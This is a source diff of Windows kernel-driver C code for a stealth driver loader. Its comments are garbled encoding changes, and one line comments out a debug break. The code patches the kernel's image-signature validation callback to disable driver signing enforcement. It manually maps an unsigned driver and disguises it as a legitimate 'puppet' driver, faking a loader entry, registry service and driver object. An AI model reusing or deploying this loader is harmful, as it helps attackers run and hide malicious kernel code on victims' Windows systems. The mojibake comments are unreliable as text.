@@ -4,7 +4,7 @@ KEVENT WaitWorkItem;
 PDRIVER_OBJECT ShellDrv = NULL;
 BOOLEAN IsWDF = FALSE;
 
-//µ÷ÓÃShellDriverEntryÌø°å
+//è°ƒç”¨ShellDriverEntryè·³æ¿
 NTSTATUS Shim(PShellContext PSContext) {
 	NTSTATUS s = STATUS_SUCCESS;
 	ShellDriverEntry(PSContext->DrvObj, PSContext->PSTR);
@@ -13,7 +13,7 @@ NTSTATUS Shim(PShellContext PSContext) {
 
 }
 
-//Í¨¹ıÇı¶¯Ãû×Ö»ñÈ¡»ùÖ·
+//é€šè¿‡é©±åŠ¨åå­—è·å–åŸºå€
 PUCHAR GetDllBase(PUCHAR PDllName) {
 	ANSI_STRING DllNameA;
 	UNICODE_STRING DllNameU = { 0 };
@@ -39,7 +39,7 @@ PUCHAR GetDllBase(PUCHAR PDllName) {
 	return ReturnBase;
 }
 
-//ÉèÖÃÒ³Ãæ¿ÉĞ´
+//è®¾ç½®é¡µé¢å¯å†™
 VOID SetWrite(ULONG64 va) {
 	PPT_ENTRY_4KB ppte = NULL;
 	PTE_HIERARCHY context = { 0 };
@@ -53,7 +53,7 @@ VOID SetWrite(ULONG64 va) {
 ULONG64 WdfR0() {
 	return 0;
 }
-//Ìî³äIAT
+//å¡«å……IAT
 BOOLEAN MakeIAT(PUCHAR DllBase) {
 	PMyIID Piid = NULL;
 	PUCHAR ImportDllBase = NULL;
@@ -69,9 +69,9 @@ BOOLEAN MakeIAT(PUCHAR DllBase) {
 	Piid = (PMyIID)ImportVirtualAddress;
 	for (int i = 0; i < ImportSize; i += iidSize) {
 		if (Piid->d == 0)
-			break;//È«²¿Ìî³äÍê³É
+			break;//å…¨éƒ¨å¡«å……å®Œæˆ
 		PDllName = (PUCHAR)(DllBase + Piid->d);
-		if (0 == memcmp(PDllName, WDF, 10)) {//WDF ĞèÒªĞŞ¸´
+		if (0 == memcmp(PDllName, WDF, 10)) {//WDF éœ€è¦ä¿®å¤
 			IsWDF = TRUE;
 			PThisIATEOffset = DllBase + Piid->e;
 			while (*PThisIATEOffset != 0) {
@@ -100,7 +100,7 @@ BOOLEAN MakeIAT(PUCHAR DllBase) {
 	return TRUE;
 }
 
-//½ûÓÃÇ©ÃûÇ¿ÖÆĞÔ»Øµ÷
+//ç¦ç”¨ç­¾åå¼ºåˆ¶æ€§å›è°ƒ
 ULONG64 MySeValidateImageHeader() {
 	return 0;
 }
@@ -114,7 +114,7 @@ struct _WDF_BIND_INFO {
 	ULONG64 FuncTable;
 	ULONG64 Module;
 };
-//¼ÓÔØÒş²ØÇı¶¯
+//åŠ è½½éšè—é©±åŠ¨
 VOID LoadDrv(PWCHAR DrvPath) {
 
 	int un = 0;
@@ -127,14 +127,14 @@ VOID LoadDrv(PWCHAR DrvPath) {
 	UNICODE_STRING String1;
 	PKTHREAD thread = NULL;
 	KIRQL OldIrql = 0;
-	//³õÊ¼»¯ÊÂ¼ş
+	//åˆå§‹åŒ–äº‹ä»¶
 	KeInitializeEvent(&WaitWorkItem, SynchronizationEvent, FALSE);
 
-	//½ûÓÃÇı¶¯Ç©ÃûÇ¿ÖÆ  Èç¹ûĞèÒª¼ÓÔØµÄÇı¶¯ÓĞÇ©Ãû£¬¾Í²»ĞèÒªÕâÒ»²¿·ÖÁË£¬ÒòÎªÈİÒ×À¶ÆÁ
+	//ç¦ç”¨é©±åŠ¨ç­¾åå¼ºåˆ¶  å¦‚æœéœ€è¦åŠ è½½çš„é©±åŠ¨æœ‰ç­¾åï¼Œå°±ä¸éœ€è¦è¿™ä¸€éƒ¨åˆ†äº†ï¼Œå› ä¸ºå®¹æ˜“è“å±
 	CIFun = *Pqword_14040EF40;
 	DbgPrint("PSeValidateImageHeader here %p\n", Pqword_14040EF40);
 	*Pqword_14040EF40 = MySeValidateImageHeader;
-	//Ó³ÉäÇı¶¯
+	//æ˜ å°„é©±åŠ¨
 	RtlInitUnicodeString(&Path, DrvPath);
 	NTSTATUS s0 = MiGenerateSystemImageNames(&Path, 0, 0, &Out, Out14, &String1);
 	thread = MmAcquireLoadLock();
@@ -149,10 +149,10 @@ VOID LoadDrv(PWCHAR DrvPath) {
 	KeRaiseIrql(1, &OldIrql);
 	NTSTATUS s2 = MiMapSystemImage(Section, DllBase);
 	KeLowerIrql(OldIrql);
-	//»Ö¸´Çı¶¯Ç©ÃûÇ¿ÖÆ  Èç¹ûĞèÒª¼ÓÔØµÄÇı¶¯ÓĞÇ©Ãû£¬¾Í²»ĞèÒªÕâÒ»²¿·ÖÁË£¬ÒòÎªÈİÒ×À¶ÆÁ
+	//æ¢å¤é©±åŠ¨ç­¾åå¼ºåˆ¶  å¦‚æœéœ€è¦åŠ è½½çš„é©±åŠ¨æœ‰ç­¾åï¼Œå°±ä¸éœ€è¦è¿™ä¸€éƒ¨åˆ†äº†ï¼Œå› ä¸ºå®¹æ˜“è“å±
 	*Pqword_14040EF40 = CIFun;
 
-	//»ñÈ¡DriverEntry
+	//è·å–DriverEntry
 	PIMAGE_NT_HEADERS Head = RtlImageNtHeader(DllBase);
 	PUCHAR Headd = (PUCHAR)Head;
 	int* p = NULL;
@@ -161,23 +161,23 @@ VOID LoadDrv(PWCHAR DrvPath) {
 	*c = DllBase + *p;
 
 
-	//ĞŞ¸´IAT
+	//ä¿®å¤IAT
 	if (!MakeIAT(DllBase)) {
 		return;
 	}
 	
 
-	//ĞŞ¸´_security_cookie
+	//ä¿®å¤_security_cookie
 	int size = 0;
 	PULONG64 ConfigAdd = 0;
 	PULONG64 P_security_cookieAddress = NULL;
 	ConfigAdd = RtlImageDirectoryEntryToData(DllBase, 1, 0xA, &size);
 	P_security_cookieAddress = ConfigAdd[0xb];
 	SetWrite(P_security_cookieAddress);
-	*P_security_cookieAddress = 1;//ËæÒâ¸ü¸Ä£¬µ«ÊÇÒ»¶¨Òª¸Ä
+	*P_security_cookieAddress = 1;//éšæ„æ›´æ”¹ï¼Œä½†æ˜¯ä¸€å®šè¦æ”¹
 
 	
-	//ĞŞ¸´WDF(½öWDFĞèÒªĞŞ¸´£¬WDMÎŞÊÓ)
+	//ä¿®å¤WDF(ä»…WDFéœ€è¦ä¿®å¤ï¼ŒWDMæ— è§†)
 	struct _WDF_BIND_INFO* PWdfBindInfo = ((ULONG64)P_security_cookieAddress) + 0x10;
 	PULONG64 PWdfFunctions = PWdfBindInfo->FuncTable;
 	PULONG64 PWdfDriverGlobals = NULL;
@@ -199,22 +199,22 @@ VOID LoadDrv(PWCHAR DrvPath) {
 	DbgPrint("DllBase:%p\n", DllBase);
 	ShellContext SContext = { 0 };
 	SContext.DrvObj = FindNotDeviceDriver();
-	ULONG64 OldDriverUnLoad = SContext.DrvObj->DriverUnload;//±¸·İÒ»ÏÂDriverUnLoad
+	ULONG64 OldDriverUnLoad = SContext.DrvObj->DriverUnload;//å¤‡ä»½ä¸€ä¸‹DriverUnLoad
 	WORK_QUEUE_ITEM WorkItem = {0};
 	WorkItem.WorkerRoutine = Shim;
 	WorkItem.Parameter = &SContext;
 	WorkItem.List.Flink = 0i64;
 	ExQueueWorkItem(&WorkItem, DelayedWorkQueue);
-	//µÈÒ»ÏÂ
+	//ç­‰ä¸€ä¸‹
 	KeWaitForSingleObject(&WaitWorkItem, Executive, KernelMode, FALSE, NULL);
 
-	//»¹Ô­DriverUnLoad
+	//è¿˜åŸDriverUnLoad
 	SContext.DrvObj->DriverUnload = OldDriverUnLoad;
 
-	//Ìá½»½Ù³ÖÉè±¸
+	//æäº¤åŠ«æŒè®¾å¤‡
 	IopReadyDeviceObjects(SContext.DrvObj);
 
-	//ÊÍ·Å
+	//é‡Šæ”¾
 	if (IsWDF == TRUE) {
 		ExFreePool(*PWdfFunctions);
 		ExFreePool(*PWdfDriverGlobals);
@@ -224,8 +224,8 @@ VOID LoadDrv(PWCHAR DrvPath) {
 	
 }
 
-//-------------------------------------------Çı¶¯Î±×°
-//´´½¨×¢²á±íÏî ·µ»Ø¶ÔÓ¦×¢²á±í¾ä±ú
+//-------------------------------------------é©±åŠ¨ä¼ªè£…
+//åˆ›å»ºæ³¨å†Œè¡¨é¡¹ è¿”å›å¯¹åº”æ³¨å†Œè¡¨å¥æŸ„
 HANDLE CreateRegistry(PWCHAR ODrvPath, PWCHAR ServiceName) {
 	NTSTATUS status = STATUS_SUCCESS;
 	OBJECT_ATTRIBUTES objAttrs = { 0 };
@@ -261,9 +261,9 @@ HANDLE CreateRegistry(PWCHAR ODrvPath, PWCHAR ServiceName) {
 	return hReg;
 }
 
-//ADrvPath ¶ñÒâÇı¶¯Â·¾¶£º  ÀıÈç£ºL"\\??\\C:\\Users\\52pojie\\Desktop\\A.sys"
-//ODrvPath ¿şÀÜÇı¶¯Â·¾¶£º  ÀıÈç£ºL"\\??\\C:\\Users\\52pojie\\Desktop\\T.sys"
-//ServiceName ¿şÀÜ·şÎñÃû£º ÀıÈç£ºL"xixi"
+//ADrvPath æ¶æ„é©±åŠ¨è·¯å¾„ï¼š  ä¾‹å¦‚ï¼šL"\\??\\C:\\Users\\52pojie\\Desktop\\A.sys"
+//ODrvPath å‚€å„¡é©±åŠ¨è·¯å¾„ï¼š  ä¾‹å¦‚ï¼šL"\\??\\C:\\Users\\52pojie\\Desktop\\T.sys"
+//ServiceName å‚€å„¡æœåŠ¡åï¼š ä¾‹å¦‚ï¼šL"xixi"
 BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PDRIVER_OBJECT PTDrvObj = NULL;
@@ -271,19 +271,19 @@ BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) 
 	WCHAR ServiceNameBuffer[0x50] = { 0 };
 	HANDLE HRegistry = NULL;
 
-	//Ó³Éä¡¢ĞŞ¸´IAT
+	//æ˜ å°„ã€ä¿®å¤IAT
 	int un = 0;
 	PUCHAR PADriverSection = NULL;
 	PLDR_DATA_TABLE_ENTRY PODriverSection = NULL;
 	PLDR_DATA_TABLE_ENTRY NewPODriverSection = NULL;
-	//ÕâÈı¸ö¶¼ÊÇADrvµÄĞÅÏ¢
+	//è¿™ä¸‰ä¸ªéƒ½æ˜¯ADrvçš„ä¿¡æ¯
 	PUCHAR Section = NULL;
 	PUCHAR DllBase = NULL;
 	ULONG32 DllSize = 0;
 
 	UNICODE_STRING ADrvPathUn;
 	UNICODE_STRING ODrvPathUn;
-	//ÕâÁ½¸ö¶¼ÊÇODrvµÄĞÅÏ¢
+	//è¿™ä¸¤ä¸ªéƒ½æ˜¯ODrvçš„ä¿¡æ¯
 	UNICODE_STRING OutU;
 	UNICODE_STRING Out14[14];
 
@@ -310,47 +310,47 @@ BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) 
 	WORK_QUEUE_ITEM WorkItem = { 0 };
 
 	KIRQL OldIrql = 0;
-	//´´½¨·şÎñ×¢²á±í
+	//åˆ›å»ºæœåŠ¡æ³¨å†Œè¡¨
 	HRegistry = CreateRegistry(ODrvPath, ServiceName);
-	DbgBreakPoint();
+	//DbgBreakPoint();
 	try {
-		//ÉÏËø
+		//ä¸Šé”
 		ExAcquireResourceExclusiveLite(PIopDriverLoadResource, 1);
-		//½ûÓÃÇı¶¯Ç©ÃûÇ¿ÖÆ Èç¹ûĞèÒª¼ÓÔØµÄÇı¶¯ÓĞÇ©Ãû£¬¾Í²»ĞèÒªÕâÒ»²¿·ÖÁË£¬ÒòÎªÈİÒ×À¶ÆÁ
+		//ç¦ç”¨é©±åŠ¨ç­¾åå¼ºåˆ¶ å¦‚æœéœ€è¦åŠ è½½çš„é©±åŠ¨æœ‰ç­¾åï¼Œå°±ä¸éœ€è¦è¿™ä¸€éƒ¨åˆ†äº†ï¼Œå› ä¸ºå®¹æ˜“è“å±
 		CIFun = *Pqword_14040EF40;  
 		DbgPrint("PSeValidateImageHeader here %p\n", Pqword_14040EF40);
 		*Pqword_14040EF40 = MySeValidateImageHeader;
 
-		//Ó³ÉäÇı¶¯
+		//æ˜ å°„é©±åŠ¨
 		RtlInitUnicodeString(&ADrvPathUn, ADrvPath);
 		status = MiGenerateSystemImageNames(&ADrvPathUn, 0, 0, &OutU, Out14, &AString);
-		//OUT : UN"ÒÑÇ©Ãû.sys" 
-		//Out14[0] : UN"PathÇ°×º" Out14[3] : UN"\Driver\"
-		//String1 Í¬ Path
+		//OUT : UN"å·²ç­¾å.sys" 
+		//Out14[0] : UN"Pathå‰ç¼€" Out14[3] : UN"\Driver\"
+		//String1 åŒ Path
 		RtlInitUnicodeString(&ODrvPathUn, ODrvPath);
 		status = MiGenerateSystemImageNames(&ODrvPathUn, 0, 0, &OutU, Out14, &OString);
 
 		//DbgBreakPoint();
-		//´´½¨DriverSection
+		//åˆ›å»ºDriverSection
 		thread = MmAcquireLoadLock();
 		status = MiObtainSectionForDriver(&AString, &ADrvPathUn, 0, 0, &PADriverSection);
 		status = MiObtainSectionForDriver(&OString, &ODrvPathUn, 0, 0, &PODriverSection);
 		MmReleaseLoadLock(thread);
 
-		//Ó³ÉäADrv,²»Ó³ÉäODrv
-		Section = *(PULONG64)(PADriverSection + SectionOffset);//¸ÄÁËÕâ
+		//æ˜ å°„ADrv,ä¸æ˜ å°„ODrv
+		Section = *(PULONG64)(PADriverSection + SectionOffset);//æ”¹äº†è¿™
 		DllBase = MiGetSystemAddressForImage(Section, 0, &un);
 
 		KeRaiseIrql(1, &OldIrql);
 		NTSTATUS s2 = MiMapSystemImage(Section, DllBase);
 		KeLowerIrql(OldIrql);
 
-		//»Ö¸´Çı¶¯Ç©ÃûÇ¿ÖÆ  Èç¹ûĞèÒª¼ÓÔØµÄÇı¶¯ÓĞÇ©Ãû£¬¾Í²»ĞèÒªÕâÒ»²¿·ÖÁË£¬ÒòÎªÈİÒ×À¶ÆÁ
+		//æ¢å¤é©±åŠ¨ç­¾åå¼ºåˆ¶  å¦‚æœéœ€è¦åŠ è½½çš„é©±åŠ¨æœ‰ç­¾åï¼Œå°±ä¸éœ€è¦è¿™ä¸€éƒ¨åˆ†äº†ï¼Œå› ä¸ºå®¹æ˜“è“å±
 		*Pqword_14040EF40 = CIFun;
 		Head = RtlImageNtHeader(DllBase);
 		DllSize = *(PULONG32)(Head + 0x50);
 
-		//Ìá½»DriverSection
+		//æäº¤DriverSection
 		PODriverSection->SizeOfImage = DllSize;
 		PODriverSection->DllBase = DllBase;
 		status = MiConstructLoaderEntry(PODriverSection, &OutU, &OString, 0, 1, &NewPODriverSection);
@@ -360,13 +360,13 @@ BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) 
 		//flag 0x49104000
 
 
-		//ĞŞ¸´IAT
+		//ä¿®å¤IAT
 		if (!MakeIAT(DllBase)) {
 			return FALSE;
 		}
 
 
-		//ĞŞ¸´_security_cookie
+		//ä¿®å¤_security_cookie
 		int size = 0;
 		ConfigAdd = RtlImageDirectoryEntryToData(DllBase, 1, 0xA, &size);
 		P_security_cookieAddress = ConfigAdd[0xb];
@@ -374,7 +374,7 @@ BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) 
 		*P_security_cookieAddress = 1;
 		//SetWrite(P_security_cookieAddress, 0);
 
-		//ĞŞ¸´WDF
+		//ä¿®å¤WDF
 		if (IsWDF == TRUE) {
 			PWdfBindInfo = ((ULONG64)P_security_cookieAddress) + 0x10;
 			PWdfFunctions = PWdfBindInfo->FuncTable;
@@ -398,7 +398,7 @@ BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) 
 		DbgPrint("DllBase:%p\n", DllBase);
 
 
-		//¹¹ÔìDriverObject²¢²åÈë
+		//æ„é€ DriverObjectå¹¶æ’å…¥
 		memcpy(ServiceNameBuffer, DrvObjNamePrefix, 2 * wcslen(DrvObjNamePrefix));
 		memcpy(&ServiceNameBuffer[wcslen(DrvObjNamePrefix)], ServiceName, 2 * wcslen(ServiceName));
 		RtlInitUnicodeString(&ObjectName, ServiceNameBuffer);
@@ -421,7 +421,7 @@ BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) 
 		PTDrvObj->Flags |= 2;
 		//DbgBreakPoint();
 		status = ObInsertObjectEx(PTDrvObj, 0, 1, 0, 0, 0, &DrvH);
-		ExReleaseResourceLite(PIopDriverLoadResource);//½âËø
+		ExReleaseResourceLite(PIopDriverLoadResource);//è§£é”
 		status = ObReferenceObjectByHandle(DrvH, 0, *PIoDriverObjectType, 0, &PTDrvObj, NULL);
 		ZwClose(DrvH);
 		PTDrvObj->HardwareDatabase = PCmRegistryMachineHardwareDescriptionSystemName;
@@ -447,9 +447,9 @@ BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) 
 		ExQueueWorkItem(&WorkItem, DelayedWorkQueue);
 
 		KeWaitForSingleObject(&WaitWorkItem, Executive, KernelMode, FALSE, NULL);
-		//Ìá½»Éè±¸
+		//æäº¤è®¾å¤‡
 		IopReadyDeviceObjects(PTDrvObj);
-		//ÊÍ·Å
+		//é‡Šæ”¾
 		ExFreePool(PSTR);
 		ZwClose(HRegistry);
 		if (IsWDF == TRUE) {
